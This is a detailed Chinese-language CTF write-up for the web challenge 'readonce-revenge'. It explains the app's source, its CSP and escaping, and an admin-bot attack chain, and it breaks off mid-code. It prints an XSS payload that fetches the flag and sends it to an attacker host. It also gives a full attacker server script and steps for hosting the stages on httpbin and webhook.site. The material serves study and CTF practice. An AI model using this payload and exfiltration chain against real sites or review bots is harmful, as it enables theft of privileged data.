# readonce-revenge 题解与完整复现

| 项 | 值 |
|---|---|
| 比赛 | PwnSec CTF 2026 |
| 类别 | Web |
| 难度 | Hard |
| 分值 | 242 |
| 远程实例 | 已随比赛结束销毁，本文全部结论基于本地 Docker 复现 |
| 本地 flag | `pwnsec{real_flag_on_remote}`（部署配置里写入的占位值） |
| 解题状态 | 已解出，flag 为 `pwnsec{917872750f693769}` |

> 名词说明：**flag** 指比赛的最终目标字符串（本题格式为 `pwnsec{...}`），拿到它就代表解出本题。
>
> **CTF** 指 Capture The Flag，网络安全夺旗赛；本文的类别 **Web** 指网页应用方向，难度档 **Hard** 对应"困难"。

本文从部署开始，按事件发生顺序把正常行为与攻击链放在同一条时间线上走一遍；每一处机制都有源码位置或本地运行日志作依据。

## 目录

- [一、这道题在做什么](#一这道题在做什么)
- [二、完整复现（从部署到拿到 flag）](#二完整复现从部署到拿到-flag)
- [三、速查与参考](#三速查与参考)
- [四、完整链复现日志](#四完整链复现日志)
- [五、攻击脚本逐段讲解](#五攻击脚本逐段讲解)
- [六、复现指南](#六复现指南)
- [七、防御建议](#七防御建议)
- [附录](#附录)

---

## 一、这道题在做什么

题目是一个笔记系统。你可以写笔记、预览笔记，也可以把某个网址提交给"审查员"检查。审查员是一个自动化的无头浏览器（本题里叫机器人 bot），它拥有管理员权限，并且能读取到 flag。它收到待检查网址后会自动访问，全流程固定，不受提交者控制。

flag 在管理员专属接口 `/api/flag` 里，只有管理员身份能读到。你的目标：让一段自己写的 JavaScript（浏览器里运行的编程语言）在机器人浏览器里的**挑战域页面**（挑战域：题目服务器自身的网域）上执行，然后用它的管理员身份读取 flag。

系统的四个角色：

| 角色 | 说明 |
|---|---|
| 用户（你） | 创建笔记、提交网址；在服务器眼里没有任何特殊权限 |
| 服务器 | 网站的服务器程序，保存笔记、维护"当前审查任务"、提供 `/api/flag` |
| 机器人 | 内置在服务器进程里的自动化浏览器，持有管理员会话，按固定流程执行审查 |
| 攻击者 | 你的目标身份：借机器人之手读走 flag |

三个必须先记住的规则：

1. **笔记 HTML（HyperText Markup Language，网页的组成语言）上限 128 个字符**（`/create` 源码里 `slice(0, 128)`），想塞攻击代码必须精打细算。
2. **机器人固定按顺序做四步**：访问审查页 → 访问 `/api/flag`（把 flag 写进服务器内存里的一份审查记录）→ 调用"就绪"接口 → 访问你提交的网址并停留 10 秒。每一步都带着管理员身份。
3. **审查页第一次被访问只留标记；第二次访问才进入"渲染笔记原文"的分支，而且要通过全部检查（2.6 节列出）才会真的把笔记渲染出来**。渲染分支的页面没有 CSP（Content Security Policy，内容安全策略：浏览器限制页面能加载和执行哪些内容的安全机制）保护：这里就是 XSS（Cross-Site Scripting，跨站脚本攻击：让攻击者的脚本在受害网站的页面上执行）的落点，也是整条攻击链要到达的终点。

攻击链的大致路线（细节从 2.5 起在各节展开）：

1. 把 XSS 笔记的编号塞进提交网址，让"笔记原文"与本次审查任务绑定；
2. 在机器人访问的页面里，用弹窗打开审查流程，在页面切换的瞬间投递一条消息，把审查任务标记成"已批准"；
3. 连续导航若干次，把最初那次"审查页访问"挤出浏览器的页面缓存；
4. 用历史回退回到最初那条审查页网址，触发一次真实的重新访问；
5. 服务器通过全部检查，渲染笔记原文，XSS 执行，flag 转发到攻击者服务器。

第二章按这条路线逐节展开，跟着走即可；其余章节是速查、复现与防御材料，按需查阅。

## 二、完整复现（从部署到拿到 flag）

本章目标：从部署开始，按发生顺序完整复现整条攻击，直到拿到 flag；过程中把涉及的系统机制在本章内讲清（需要回查的表格在第三章）。

### 2.1 部署

题目附件是 `readonce-revenge.zip`，解压后得到以下内容（本文示例把解压目录命名为 `readonce-revenge/`，你也可以用任何名字）：

```
readonce-revenge/
├── src/              # 挑战服务器（Express）
│   ├── server.js     # 全部路由与状态
│   └── views/        # 页面模板
├── bot/
│   └── bot.js        # 机器人程序（被 server.js 直接引用）
├── public/style.css
├── Dockerfile                # 镜像构建脚本：Node 22 + Chromium
└── docker-compose.yml        # Compose 配置：服务定义（端口映射、环境变量）
```

`src/` 里是网站的服务器程序，用 **Node.js** 的 **Express** 框架编写。Node.js 是用 JavaScript 写服务端程序的运行环境；Express 是它最常用的网站框架，负责路由、请求解析、cookie 会话这些基础工作。入口文件 `server.js` 包含全部路由逻辑，第三章细看。

Docker Compose 的配置文件（根目录的 `docker-compose.yml`）里配置了几个关键环境变量。Compose 是 Docker 的编排工具：用一份配置文件描述要运行的服务（镜像怎么构建、端口怎么映射、环境变量有哪些），再用一条 `docker compose up` 启动它。

```yaml
environment:
  PORT: "3000"
  APP_URL: "http://localhost:3000"
  FLAG: "pwnsec{real_flag_on_remote}"
  BOT_TOKEN: "local-bot-token"
  SESSION_SECRET: "looosoosw"
```

四个变量的作用：

| 变量 | 作用 |
|---|---|
| `FLAG` | 目标字符串本体。服务端启动时读进内存（源码里 `const FLAG = process.env.FLAG`），`/api/flag` 返回的就是它。放进环境变量是为了不写进代码，部署时替换（本地即上面的占位值） |
| `BOT_TOKEN` | 机器人口令，用于验证请求来自机器人：`/reports/session` 和 `/reports/arm/:id` 都检查请求头 `X-Bot-Token`。服务器和机器人读同一个变量，两边对上；攻击者不知道它 |
| `SESSION_SECRET` | 会话 cookie 的签名密钥：`sid` cookie 由它签名，服务器收到后验签，防止伪造会话。本地固定测试值，远程部署用随机强值 |
| `PORT`、`APP_URL` | 服务端监听端口；机器人访问服务端所用的基地址 |

启动：

```bash
cd readonce-revenge
docker compose up -d --build
curl -s -o /dev/null -w "%{http_code}\n" http://localhost:3000/   # 200
```

浏览器打开 `http://localhost:3000/`，界面分三块：创建笔记（Create note）、提交文档（Report document）、最近笔记列表。

### 2.2 创建笔记与预览（网页操作）

浏览器打开 `http://localhost:3000/`，在"Create note"面板里操作：

1. Title 填 `manual`（上限 10 个字符）；
2. HTML body 填下面这条 payload（111 个字符，在 128 上限内，实际是一行）：
   `<img src=q onerror='fetch("/api/flag").then(r=>r.text()).then(t=>location="//host.docker.internal:9975/f?"+t)'>`
3. 点 Create 按钮。

页面会跳转到这条笔记的预览页（地址形如 `/note/<编号>`）。观察两件事：

1. **笔记编号**：地址栏和笔记列表里都能看到一个 20 位的十六进制字符串，后面提交审查时要用它；
2. **正文显示的是原样文字**：payload 被转义成一串文本（`&lt;img … &gt;`），而不是被当作标签。

第二条是题目的设计：预览页对笔记内容做了两层保护。第一层是模板转义（`<pre><%= note.html %></pre>` 把笔记当纯文本插入，HTML 标签失去作用）；第二层是响应头里的 CSP（Content Security Policy，内容安全策略），它在浏览器端拒绝这个页面的资源加载请求（图片、脚本、样式、连接等）和内联代码执行。它具体怎么配、为什么这样配，2.4 有完整拆解。记住这个差别，后面会用到：**同一篇笔记，在预览页是纯文本（上面两层保护都生效）；在审查渲染分支输出的页面里会被当作真正的 HTML 执行**（渲染分支这两层保护都没有；机制见 2.6，执行见 2.11）。

此刻，这条 payload 只会以文本形式显示；它所在的笔记将在 2.5 随提交网址进入审查流程，payload 本身会在 2.11 被浏览器执行。

回到首页，刚创建的笔记会出现在"最近笔记列表"里，点 preview 可以再次打开预览页。

### 2.3 创建笔记（命令行）

同一件事再用命令行工具 curl（在终端里直接发送 HTTP 请求的程序）做一遍：

```bash
curl -si -X POST http://localhost:3000/create \
  --data-urlencode "title=manual" \
  --data-urlencode "html=<img src=q onerror='fetch(\"/api/flag\").then(r=>r.text()).then(t=>location=\"//host.docker.internal:9975/f?\"+t)'>"
```

完整响应：

```text
HTTP/1.1 302 Found
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
Origin-Agent-Cluster: ?1
Referrer-Policy: no-referrer
Strict-Transport-Security: max-age=15552000; includeSubDomains
X-Content-Type-Options: nosniff
X-DNS-Prefetch-Control: off
X-Download-Options: noopen
X-Frame-Options: SAMEORIGIN
X-Permitted-Cross-Domain-Policies: none
X-XSS-Protection: 0
Location: /note/c350151803f0f8f3d507
Vary: Accept
Content-Type: text/plain; charset=utf-8
Content-Length: 48
Date: Sat, 19 Sep 2026 07:54:53 GMT
Connection: keep-alive
Keep-Alive: timeout=5

Found. Redirecting to /note/c350151803f0f8f3d507
```

返回的 `302` 是 HTTP（HyperText Transfer Protocol，超文本传输协议）状态码，含义是"跳转到新地址"，所以浏览器会接着打开 `Location` 指向的笔记预览页。服务器把笔记存进服务器内存里的一张键值表，键是笔记编号（是 10 字节的随机十六进制），create 接口的服务端代码：

```typescript
app.post("/create", (req, res) => {
  const title = String(req.body.title || "").trim().slice(0, 10);
  const html = String(req.body.html || "").slice(0, 128);

  if (!title || !html) {
    res.status(400).render("message", { title: "Bad note", message: "Missing title or body." });
    return;
  }

  const id = randomId(10);  // 创建笔记编号
  // 模拟真实服务端的存储，存储笔记数据
  notes.set(id, {
    id,
    title,  // 笔记标题
    html,   // 笔记内容
    createdAt: Date.now(),
  });

  res.redirect(`/note/${encodeURIComponent(id)}`);
});

```

现在，回到`完整响应`，这个输出里有两组"在题目源码里搜不到"的东西，先分清，后面遇到类似的输出就不会浪费时间：

- **响应体 `Found. Redirecting to /note/...` 不是题目代码写的**：题目代码只有一行 `res.redirect(...)`（把编号拼进跳转地址），响应体由 Express 的 `res.redirect()` 默认生成。其中 `Found` 是 HTTP 对 302 的标准短语（来自 `statuses` 依赖包），Express 按请求的 `Accept` 头选择版本：命令行看到纯文本版，浏览器看到 HTML 版（`<p>Found. Redirecting to <a ...>`），响应里的 `Vary: Accept` 就来自这次内容协商。
- **一批安全头也不是题目代码写的**：`Cross-Origin-Opener-Policy`、`X-Frame-Options`、`Strict-Transport-Security` 等十来个头来自 `helmet`（一个给 Express 应用自动加一批安全响应头的库）中间件的默认配置（题目代码只有 `app.use(helmet({ contentSecurityPolicy: false }))` 一行，只关掉了其中的 CSP 一项）。

要查这两组东西，去 `node_modules` 里搜（例如 `express/lib/response.js` 的 redirect 函数、`statuses/codes.json`）。响应里真正与题目自身行为相关的只有 `Location` 和 `Vary`。读响应时先分清"框架默认"和"应用自定义"，能省很多翻源码的时间。

命令行适合后续批量操作；手动点一遍可以顺便确认页面观感。

### 2.4 预览笔记

预览刚才创建的笔记：

```bash
curl -si http://localhost:3000/note/c350151803f0f8f3d507
```

完整响应：

```text
HTTP/1.1 200 OK
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
Origin-Agent-Cluster: ?1
Referrer-Policy: no-referrer
Strict-Transport-Security: max-age=15552000; includeSubDomains
X-Content-Type-Options: nosniff
X-DNS-Prefetch-Control: off
X-Download-Options: noopen
X-Frame-Options: SAMEORIGIN
X-Permitted-Cross-Domain-Policies: none
X-XSS-Protection: 0
Content-Security-Policy: default-src 'none'; style-src 'self'; img-src 'none'; base-uri 'none'; frame-ancestors 'none'
Content-Type: text/html; charset=utf-8
Content-Length: 708
ETag: W/"2c4-vk0cnITZv6PybK/b0EOva9fTmFM"
Date: Sat, 19 Sep 2026 07:54:55 GMT
Connection: keep-alive
Keep-Alive: timeout=5

<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>manual | ReadOnce Docs</title>
  <link rel="stylesheet" href="/style.css">
</head>
<body>
  <main>
    <header>
      <div>
        <h1>ReadOnce Docs</h1>
        <p class="muted">Oi, make your notes, yeah?</p>
      </div>
      <a href="/">Dashboard</a>
    </header>

    <section class="panel">
      <h2>manual</h2>
      <p class="muted">Document preview.</p>
      <pre>&lt;img src=q onerror=&#39;fetch(&#34;/api/flag&#34;).then(r=&gt;r.text()).then(t=&gt;location=&#34;//host.docker.internal:9975/f?&#34;+t)&#39;&gt;</pre>
    </section>
  </main>
</body>
</html>
```

再结合返回上面页面的服务端代码：

```typescript
app.get("/note/:id", (req, res) => {
  const note = notes.get(req.params.id);
  if (!note) {
    res.status(404).render("message", { title: "Missing", message: "Document not found." });
    return;
  }

  res.setHeader(
    "Content-Security-Policy",
    "default-src 'none'; style-src 'self'; img-src 'none'; base-uri 'none'; frame-ancestors 'none'"
  );
  // "note" 是视图名（经 Express 视图配置解析，指向 src/views/note.ejs 模板）
  // 第二个参数里的 note：按 URL 编号从 notes 表取出的笔记记录（即 create 接口当时写入的那一条）
  res.render("note", { title: note.title, note });
});
```

接下来，回到`/note/:id`接口的响应，它里有预览页的两层保护，作用不同：**转义让笔记里的标签从一开始就不存在**（决定性的一层）；**CSP 在标签万一被写进页面时拒绝执行**（第二道）。逐个看：

- **响应头里的 `Content-Security-Policy`（CSP，内容安全策略）**：它是一条发给浏览器的指令，规定"这个页面允许加载哪些东西"。这里配置的值是：
  - `default-src 'none'`：所有类别的资源都默认禁止。这里没有"外部/内部"之分：外链脚本加载不了；页面里内联的 `<script>` 同样没有执行许可（内联要执行必须"显式授权"，做法见本节末尾的补充）。
  - 另外两项调整：同源样式表放行（`style-src 'self'`）、禁止页面被别人嵌入（`frame-ancestors 'none'`）。
  - 这一层的作用：万一转义被改坏、或有别的注入点把标签写进了页面，浏览器端仍然拒绝执行。但就预览页而言，更关键的是下一条的转义：笔记里就算写了 `<script>`，标签也早在进入页面之前就变成了文本。
- **模板转义（决定性的一层）**：
  - 位置在 `src/views/note.ejs`，关键就一行 `<pre><%= note.html %></pre>`。其中 `<%=` 是 EJS（一个把模板文件渲染成 HTML 的模板引擎）模板的"转义输出"：把内容里的 `<`、`>` 等符号替换成 `&lt;`、`&gt;` 再插入页面。所以上面响应体里 `<pre>` 中显示的是**转义后的 payload**（`&lt;img src=q onerror=&#39;…` 一串文本），而不是可执行的标签。另外注意：笔记里就算写了 `<script>`，让它在预览页失效的是转义，不是外面的 `<pre>` 标签。`<pre>` 只影响显示格式（保留空格、等宽字体），HTML 解析器在它内部照样解析标签。
  - 如果把模板换成不转义的 `<%- note.html %>`，就算套着 `<pre>`，`<script>` 也会执行（本地写个含 `<pre><script>...</script></pre>` 的静态页面打开即可验证）。
  - 作为对照，审查渲染分支的模板 `review-document.ejs` 写的是 `<%- note.html %>`（不转义、原样插入），一字之差，安全性质完全相反：**同一篇笔记，预览页只当文本，渲染分支会当真正的 HTML 执行**。这个差别是后面整条攻击链的立足点。

**同一条 payload 在两个页面上的命运**

回到 2.2 创建的那条 payload。它由两部分拼成：一张图片的资源获取（`<img src=q>`）和一个内联事件处理器（`onerror='…'`）。

- 在预览页，转义让整个标签不成立（前面讲过）；单看 CSP 这一层，它的每个部分也各有归宿。
- 在渲染分支输出的页面（2.11）则相反，那里没有转义、也没有 CSP，同样的代码会被原样执行。

两个页面的行为对比：

| payload 部分 | 属于什么 | 预览页（CSP 为 `default-src 'none'`） | 渲染页（见 2.11，无 CSP） |
|---|---|---|---|
| `<img src=q>` | 资源获取（`img-src` 兜底 `'none'`） | 被禁，图片不加载 | 正常发起请求（404，失败） |
| `onerror='…'` | 内联事件处理器（`script-src` 兜底 `'none'`） | 被禁，处理器不注册（后面代码无从运行） | 注册，并在失败时执行 |
| `fetch("/api/flag")` | 运行时连接（`connect-src` 管） | 到不了这一步 | 同源放行 |
| `location="…"` | 顶层导航（不在"获取指令"管辖范围） | 到不了这一步 | 放行 |

**"到不了这一步"的含义**

转义让标签从一开始就不存在；即便标签存在，图片请求会被 `img-src 'none'` 拒绝、`onerror` 属性会被 `script-src` 兜底拒绝注册。假设处理器真的执行：`fetch` 还会被 `connect-src` 兜底拒绝（预览页没写这条指令，由 `default-src 'none'` 兜底）；`location` 是顶层导航，不受这些指令管辖，真执行会直接跳走。最后，即便 `fetch` 与跳转都成功，预览页处于用户自己的会话（没有管理员身份），`/api/flag` 只会返回 `403 {"error":"reviewer only"}`，拿不到 flag。

**补充：CSP 的"显式授权"是什么意思**

预览页里内联脚本被禁，是因为它的 CSP 没有给出任何脚本授权。要让某段代码能执行，标准做法是在 CSP 里**指名放行**，常用两种：

- **nonce**：服务器每次响应生成一个随机值，同时写进 CSP 和标签：CSP 里写 `script-src 'nonce-<随机值>'`，页面里写 `<script nonce="<随机值>">……</script>`。只有带这个随机值的脚本元素能执行；攻击者就算能往页面里注入 HTML，也猜不到本次响应的随机值，写不出合法标签。
- **内容哈希**：把代码内容的哈希写进 CSP（`script-src 'sha256-<base64>'`），内容一字不差才执行；适合固定不变的内联脚本。生成方法：把标签之间的文本（逐字符原样，空格换行都算）做 SHA-256、再 Base64 编码。命令行一条：`echo -n '<脚本内容>' | openssl dgst -sha256 -binary | base64`；或者先让页面在无授权状态下被浏览器拦一次，Chrome 控制台的报错里会直接列出这段脚本的哈希，复制即用（与命令行结果一致）。内容改一个字符哈希即失效，需要重新生成并更新 CSP，这是它和 nonce 的取舍。

还有一个全部放行的写法：`'unsafe-inline'`。它放行的不只是脚本块，还包括内联在 HTML 属性与地址里的代码。同一张页面换不同的 CSP，实测结果是：

| HTML 里的写法 | CSP 为 `default-src 'none'`（预览页的配置） | CSP 为 `script-src 'unsafe-inline'` |
|---|---|---|
| `<script>console.log(1)</script>`（脚本块） | 拦截 | 执行 |
| `<button onclick="console.log(1)">`（内联事件处理器） | 拦截 | 执行 |
| `<a href="javascript:console.log(1)">`（`javascript:` 网址） | 拦截 | 执行 |

两个容易忽略的点：

- **内联事件处理器（inline event handler，即在标签里写 `onclick=` 这类写法）和 `javascript:` 网址，都在 nonce/哈希的授权范围之外**。实测：CSP 写 `script-src 'nonce-<值>'` 时，带对 nonce 的 `<script>` 块能执行，但 `<button onclick=...>` 照样被拦（nonce 只认 `<script>` 元素；冷门的 `'unsafe-hashes'` 关键字是例外，可给具体的处理代码做哈希授权，但浏览器支持不一、极少使用）。
- **两者不可兼得**（放行 = 允许执行）。`script-src` 实际只有两种可选写法，一张表说清：

| 想要的 | 唯一可行的写法 | 代价 |
|---|---|---|
| 用 nonce 保护（推荐） | `script-src 'nonce-<值>'` | 内联事件处理器、`javascript:` 网址不能使用；改写成 `addEventListener` 放进带 nonce 的脚本块 |
| 使用内联事件处理器、`javascript:` 网址 | `script-src 'unsafe-inline'`，**不能带 nonce** | 放弃 CSP 对内联脚本的防护 |

为什么没有"两个都要"的选项？因为 `script-src` 里只要出现 nonce 或哈希，浏览器就会忽略 `'unsafe-inline'`（实测：`script-src 'unsafe-inline' 'nonce-<值>'` 下三类代码全被拦）。规范设这条规则，就是逼着代码迁移到表中的第一行写法。

它放行全部代码，这正是危险所在：一旦开了它，攻击者只需让一个 `<img onerror=...>` 进入页面就能执行脚本，这一层对 XSS 的防护基本归零。名字里的 unsafe 就是这个意思。

本题的审查界面 `/review` 和沙箱页 `/sandbox` 用的就是 **nonce**：两个页面的响应 CSP 都写着 `script-src 'nonce-<本次随机值>'`，各自模板里的 script 标签都带同样的 nonce 属性。尤其注意沙箱页：它用 nonce **主动放行了一个外链脚本**，那正是攻击脚本能进入沙箱的原因（3.2 节会对照源码看）。

### 2.5 提交文档给审查员

一句话：提交之后，服务器为这次提交建立一条"本轮审查"记录，随后拉起机器人按固定流程跑一遍（访问审查页、读 flag、报就绪、打开你提交的 stage1）；本节按数据与代码的发生顺序展开。

#### 2.5.1 前置：攻击者服务器（stage1 / S2 / 收信）

> 先提前讲一些概念。提交网址指向的页面由我们自己的服务器提供。

**关于 `host.docker.internal`**

它不是注册域名，而是 Docker Desktop（Mac/Windows）内置的特殊名称：容器内向它发请求，会被转到宿主机。本节里机器人（在容器里）访问攻击者服务器（在宿主机上），地址就得写它；你自己在宿主机上想访问攻击者服务器时，用 `localhost:9975` 即可。Linux 上 Docker 默认不提供这个名称，需要按六章常见问题里的办法加 `extra_hosts`。

（stage1：机器人最终打开的那个攻击者页面；S2：随后被审查界面加载的脚本；收信：接收 flag 的端点。这三个角色分别对应 2.5.2 里本地服务器的三个路由，对应关系写在 2.5.2 的路由说明里。）

**真实 CTF（远程靶机）时的地址**

真实比赛里靶机在云端，本机没有公网 IP，攻击者内容要挂到公网可达的地方。比赛时用了两个免费的公网服务，分工不同：stage1 页面和 S2 脚本都放 httpbin（一个免费的 HTTP 测试服务），webhook.site 只用来接收外传的 flag。

1. **stage1 页面**：把 stage1 的 HTML（弹窗 + 自导航的代码）做 base64 编码，拼成 `https://httpbin.org/base64/<编码>`：httpbin 会把 URL 里的 base64 解码后原样返回，响应不带 CSP，机器人打开它时页面里的脚本正常执行（完整链接与解码原文见附录 D）；
2. **S2 脚本**：同样处理，`https://httpbin.org/base64/<S2 的 base64>` 就是它的公网地址（供审查界面的沙箱以 `<script src>` 加载，加载过程在 2.9；也就是 `window.open` 的 `u=` 参数要带的地址；完整链接见附录 D）；
3. **接收端**：`POST https://webhook.site/token` 建一个免费 token（响应 JSON 里的 `uuid` 就是地址后缀），得到的 `https://webhook.site/{uuid}` 用来收 XSS 外传的 flag；提交给 `/report` 的网址就是 stage1 的 httpbin 地址（带 `?note=<编号>`）。

两个坑（不绕开会直接断链，当时的做法都做了规避）：

- **webhook.site 免费版的响应带 CSP `script-src 'none'`**：后果：放它上面的页面被直接打开时内部脚本不执行（机器人打开后不会有任何动作）。规避：stage1 这类"页面自己跑代码"的内容放 httpbin（无 CSP）；被挑战域以 `<script src>` 加载的脚本则两种载体都可以（加载方式不受目标响应 CSP 影响，CSP 只约束文档自身）。
- **机器人的 admin cookie 建在内部 host `http://localhost:3000` 上**：后果：任何以"挑战域页面"为目标的 URL（如 `/review`）若写成外部域名（`https://xxx.chal.ctf.ae/review`），机器人打开它时不带 admin cookie，页面直接 404，链断。规避：这类 URL 都用内部 host 写（`http://localhost:3000/review?u=<S2地址>&note=<编号>`）；攻击者自己的页面（httpbin 等）用外部地址没有这个问题。

官方环境还给了一个 `callback` 地址（`instance.json` 里的 `callback`，转发到本机 8000 端口），公开 writeup 里的解法直接用它当攻击者服务器（不用 webhook.site）。

#### 2.5.2 本地验证运行的攻击服务器和攻击源码

2.5.1 讲了攻击者服务器的三个角色（stage1 / S2 / 收信）；本节是它们在本地复现里的实现：把下面代码存成 `attacker.js` 并运行 `node attacker.js`（监听本机 9975 端口；机器人从容器里经 `host.docker.internal:9975` 访问它）：

```js
const http = require("node:http");
const PORT = 9975;
const CHAL = "http://localhost:3000";
const S2 = 'addEventListener("pagehide", function(){ try { top.postMessage({p:1}, "*"); top.postMessage({p:2}, "*"); } catch(e){} });';

const srv = http.createServer((req, res) => {
  const u = new URL(req.url, "http://x");
  if (u.pathname === "/f") { console.log("\n[!!!!FLAG!!!!]", decodeURIComponent(u.search.slice(1)).slice(0, 100)); res.writeHead(200); res.end(); return; }
  if (u.pathname === "/s2p.js") { res.writeHead(200, {"Content-Type":"application/javascript"}); res.end(S2); return; }
  if (u.pathname === "/stage1") {
    res.writeHead(200, {"Content-Type":"text/html"});
    res.end('<!doctype html><body>S1<script>\n' +
      'var rid = new URLSearchParams(location.search).get("rid");\n' +
      'var note = new URLSearchParams(location.search).get("note");\n' +
      // 步骤1: 弹窗打开审查界面（顶层导航带管理员 cookie），u 指向 S2
      'window.open("' + CHAL + '/review?u=http%3A%2F%2Fhost.docker.internal%3A' + PORT + '%2Fs2p.js&rid=" + rid + "&note=" + note, "REV");\n' +
      // 步骤2: 3.5 秒后主页面连续自导航，把审查页挤出 BFCache
      'var ph = new URLSearchParams(location.search).get("ph");\n' +
      'var nn = parseInt(new URLSearchParams(location.search).get("nn")||"0");\n' +
      'if (ph === "evict") {\n' +
      '  if (nn < 8) { setTimeout(function(){ location.href = location.pathname + "?ph=evict&nn=" + (nn+1); }, 120); }\n' +
      '  else { setTimeout(function(){ history.go(-10); }, 200); }\n' +
      '} else { setTimeout(function(){ location.href = location.pathname + "?ph=evict&nn=1"; }, 3500); }\n' +
      '</scr' + 'ipt></body>');
    return;
  }
  res.writeHead(404); res.end();
});
srv.listen(PORT, () => console.log("attacker server listening on port", PORT));
```

运行输出：`attacker server listening on port 9975`

三个路由与 2.5.1 的三个角色一一对应，各自将在主线的不同阶段被请求，现在只需知道它们的存在：

- `/stage1`：对应 **stage1**，即机器人最终打开的攻击者页面（内含两段动作：弹窗打开审查界面、主页面连续自导航）；
- `/s2p.js`：对应 **S2**，审查界面的沙箱 iframe 之后会加载它；
- `/f`：对应**收信**，渲染外传阶段，flag 会作为查询串到达这里并打印。

**远程场景下这三个路由的链接怎么生成**

真实 CTF 里本机没有公网 IP（2.5.1），要把上面三个路由搬到公网载体上，链接这样生成：

1. **`/s2p.js` 的链接（先生成它）**：把本路由返回的脚本存成 `s2.js`，做 base64 编码（`python3 -c "import base64;print(base64.b64encode(open('s2.js','rb').read()).decode())"`），拼到前缀后面，得到 `https://httpbin.org/base64/<编码>`；
2. **`/stage1` 的链接**：把本路由返回的 HTML 存成 `stage1.html`，但 `u=` 参数的值换成上一步的 S2 链接（URL 编码后填进去）；再对整份 HTML 做同样的 base64 编码，拼成 `https://httpbin.org/base64/<编码>`；提交 `/report` 时在末尾追加 `?note=<当轮笔记编号>`；
3. **`/f` 的接收链接**：`curl -X POST https://webhook.site/token` 建一个免费 token，响应 JSON 里的 `uuid` 拼成 `https://webhook.site/<uuid>`，flag 外传时打到这里。

顺序要点：先 S2、再 stage1（stage1 依赖 S2 链接，且要 URL 编码后再填）；base64 只对内容本身做；`?note=` 只在提交时追加，不进 base64。等价的生成脚本（可直接照抄）：

```python
import base64, urllib.parse

# 1) S2 链接
S2 = open("s2.js", "r").read()
S2_URL = "https://httpbin.org/base64/" + base64.b64encode(S2.encode()).decode()

# 2) stage1 链接（模板里 u= 处写成 %s）
stage1_html = open("stage1_template.html", "r").read() % urllib.parse.quote(S2_URL, safe="")
report_url = "https://httpbin.org/base64/" + base64.b64encode(stage1_html.encode()).decode()
# 提交时：report_url + "?note=<编号>"

# 3) 接收链接
# curl -X POST https://webhook.site/token   → uuid → https://webhook.site/<uuid>
```

（这段代码就是第五章完整脚本的服务部分；第五章把本节后续的提交与等待也自动化了。）

#### 2.5.3 提交审查

> 向 /report 接口提交审查。

提交的表单只有一个字段：`url`（首页表单是 `<input name="url">`，见 `src/views/index.ejs`），它的值是一个网址；服务器只校验它是合法的 http/https 地址（源码里 `new URL(...)` 加协议检查），**域不受限制**。本主线提交的网址是上面刚运行起来的 stage1 页面：

```text
http://host.docker.internal:9975/stage1?note=c350151803f0f8f3d507
└──────── 攻击者服务器（上面刚启动）────────┘ └──── 查询参数 ────┘
   机器人最后会整页打开这个地址                   给 POST /report 读的
```

两部分说明：

- **路径部分 `/stage1`**：机器人最终打开的页面（它上面会执行我们准备的 JS；页面内容即前置块的代码）。机器人打开它时，服务器会自动在网址后追加 `&rid=<id>`（见下文"数据的去向"）。
- **查询参数 `?note=<编号>`**：`POST /report` 读它，决定审查页的**渲染分支**要输出哪篇笔记（机制见 2.6）；值是前面创建的笔记编号（`c350151803f0f8f3d507`）。编号的来源只有一个：创建笔记时由服务器生成、经 2.3 的 `Location` 头带回；读取动作见下面处理代码里的 `searchParams.get("note")` 一行。

两种提交方式（效果相同）：

**方式一：网页操作**

1. 在首页"Report document"面板的 URL 框里填上面的网址；
2. 点 Send（页面转圈约 10 秒的原因见下文）。

**方式二：命令行**

```bash
curl -si -X POST http://localhost:3000/report \
  --data-urlencode "url=http://host.docker.internal:9975/stage1?note=c350151803f0f8f3d507"
```

**提交之后，服务器如何处理这些数据（照源码看）**

处理这个表单的路由是 `POST /report`。代码（`src/server.js`，节选与本节直接相关的部分）：

```js
app.post("/report", async (req, res) => {
  if (currentReview) {
    res.status(429).render("message", { ... });        // 同一时间只处理一轮审查
    return;
  }

  let target;
  try { target = new URL(String(req.body.url || "")); } catch { ... }  // 解析提交的网址
  const noteId = String(target.searchParams.get("note") || "");        // 从网址里取笔记编号

  const id = randomId(12);                             // 本轮审查编号：进入 URL 后叫 rid
  currentReview = {                                     // 创建本轮审查记录
    id, url: target.href, noteId,                     // url=提交的网址原样保存；noteId=上面取出的笔记编号
    prepared: false, approved: false, used: false, visited: false,
    nonce: randomId(16), flag: null,                  // nonce：进入 URL 后叫 state；flag：机器人访问 /api/flag 时写入
  };

  try {
    await review(currentReview);                        // ← 调用机器人（本节逻辑的核心）
    res.render("message", { title: "Reviewed", message: "The reviewer finished." });
  } catch (error) {
    res.status(500).render("message", { title: "Review failed", ... });
  } finally {
    currentReview = null;                               // 无论成败，清空本轮记录
  }
});
```

**补充：这些数据的去向**

1. **外来输入两样**：`url`（你提交的网址，机器人最终要打开它）和 `noteId`（从提交网址的 `?note=` 取出；渲染分支输出哪篇笔记由它决定，渲染分支见 2.6）。
2. **本轮新造两样**：
   - **审查编号**（代码字段 `id`，进入 URL 后叫 `rid`）：出现在三处：审查页地址 `/reports/check?rid=<id>&state=<nonce>`（审查页见 2.6）；就绪接口路径 `/reports/arm/<id>`（就绪接口机制见本节下文）；机器人打开 `url`（表单里提交的 stage1 网址）时自动追加的 `&rid=<id>`。最后这一处是**页面导航**（打开攻击者页面），不是接口调用；最终地址形如 `http://host.docker.internal:9975/stage1?note=c350151803f0f8f3d507&rid=<id>`，下面日志里 `stage1?note=…&rid=…` 那一行就是它。
   - **`nonce`**（一次性秘密核对串；进入 URL 后叫 `state`）：出现在两处：审查页地址的 `state` 参数；`/complete` 接口的请求里（该接口只由攻击链触发，机制见 3.2）。请求带上正确的它，服务器才按"本轮审查的合法请求"处理；攻击者拿不到它，无法伪造这类请求（渲染分支会核对它，见 2.6）。
3. **装载与寿命**：全部装进 `currentReview`，只存在于本次 `/report` 的处理期间（处理函数要等 `await review(...)` 跑完才渲染响应，客户端因此一直挂起；响应发出后记录即清空）。两个后果：同一时间只能跑一轮审查（重复提交得 429）；攻击链必须在机器人的 10 秒停留内完成（时序表见 2.12）。

**`review()` 里机器人做事的发生顺序**（函数体在 `bot/bot.js`，节选）：

```js
const context = await browser.createBrowserContext();   // 新建浏览器上下文：cookie 的存储单元，生命周期独立于页面（同上下文的页面共享 cookie）
// 1. 用令牌把会话升级为管理员（cookie 留在 context 里）
const sessionPage = await context.newPage();
